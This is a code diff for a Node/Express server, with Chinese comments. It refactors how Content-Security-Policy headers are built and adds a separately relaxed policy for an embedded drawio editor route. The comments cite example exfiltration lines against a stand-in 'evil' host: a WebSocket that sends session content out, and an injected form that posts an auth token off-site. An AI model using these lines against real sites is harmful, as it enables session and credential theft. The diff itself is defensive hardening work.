@@ -12,7 +12,9 @@ export const clientIp = value => (value || '').toString().replace(/^::ffff:/, ''
 // 但没有理由让一个畸形输入改写策略结构）。形状不对就当没有 Host（见下）。
 const CSP_HOST_RE = /^[A-Za-z0-9.-]+(:\d{1,5})?$|^\[[0-9A-Fa-f:]+\](:\d{1,5})?$/;
 
-export function setSecurityHeaders(res, hostHeader) {
+// 指令表只有一份：主页面与 drawio 编辑器路由共用，差异走 editor 开关，避免两份列表各写一遍后漂移。
+// 唯一允许放宽的是 script-src 的 unsafe-eval——**只在 editor 这一档**，主页面永远拿不到。
+export function cspDirectives(hostHeader, { editor = false } = {}) {
   // connect-src 原本是 `'self' ws: wss:`。裸的 scheme **不限主机**：CSP 的 script 那一层一旦被
   // 突破一次（script-src 'self' 目前很紧，但纵深防的正是这一格），注入的脚本就能
   // `new WebSocket('wss://evil/')` 把会话内容整段外带，而 connect-src 不拦（L2，2026-09-17 安全审查）。
@@ -25,20 +27,24 @@ export function setSecurityHeaders(res, hostHeader) {
   // 取不到 Host（或形状不对）时回落成只有 'self'，**不是**回落成裸 scheme：失败方向是更严。
   const host = String(hostHeader ?? '').trim();
   const sameOriginWs = CSP_HOST_RE.test(host) ? ` ws://${host} wss://${host}` : '';
-  res.setHeader('Content-Security-Policy', [
+  return [
     "default-src 'self'",
-    "script-src 'self'",
+    `script-src 'self'${editor ? " 'unsafe-eval'" : ''}`,
     "style-src 'self' 'unsafe-inline'",
-    "img-src 'self' data:",
+    `img-src 'self' data:${editor ? ' blob:' : ''}`,
     `connect-src 'self'${sameOriginWs}`,
-    "font-src 'self'",
-    "frame-ancestors 'none'",
+    `font-src 'self'${editor ? ' data:' : ''}`,
+    `frame-ancestors ${editor ? "'self'" : "'none'"}`,
     // form-action 与 base-uri 都【不】回落到 default-src（CSP 规范），不显式声明即完全无限制：
     // 注入的 <form action="https://evil/"> 提交是导航、不走 connect-src，script-src 同样拦不住，
     // 用户被诱导填进去的 AUTH_TOKEN 会直接 POST 到外域。<base> 目前被 DOMPurify 剥掉，base-uri 是纵深。
     "form-action 'self'",
     "base-uri 'none'",
-  ].join('; '));
+  ];
+}
+
+export function setSecurityHeaders(res, hostHeader) {
+  res.setHeader('Content-Security-Policy', cspDirectives(hostHeader).join('; '));
   res.setHeader('X-Frame-Options', 'DENY');
   res.setHeader('X-Content-Type-Options', 'nosniff');
   res.setHeader('Referrer-Policy', 'no-referrer');
@@ -452,6 +458,19 @@ export function configureHttpShell({
     if (source === undefined) return next();
     return res.type('text/css').send(source);
   });
+  // drawio 编辑器：唯一放宽 CSP 的前缀，只服务一个独立页面（iframe + sandbox 引入），主页面策略不受影响。
+  // 路径必须带尾斜杠：drawio 用文档目录推 DRAWIO_SERVER_URL，少了斜杠会去请求 /js/app.min.js。
+  // ACAO 是必需的——iframe 用 sandbox="allow-scripts"（opaque origin）时，页面自己的 XHR 要跨源许可。
+  app.use('/drawio-editor', (req, res, next) => {
+    res.setHeader('Content-Security-Policy', cspDirectives(req.headers?.host, { editor: true }).join('; '));
+    res.setHeader('X-Frame-Options', 'SAMEORIGIN');
+    res.setHeader('X-Content-Type-Options', 'nosniff');
+    res.setHeader('Referrer-Policy', 'no-referrer');
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Cache-Control', 'no-cache');
+    next();
+  }, express.static(join(publicDir, 'vendor', 'drawio', 'editor')));
+
   app.use(express.static(publicDir, {
     setHeaders: (res, filePath) => {
       if (filePath.endsWith('.html')) res.setHeader('Cache-Control', 'no-store');
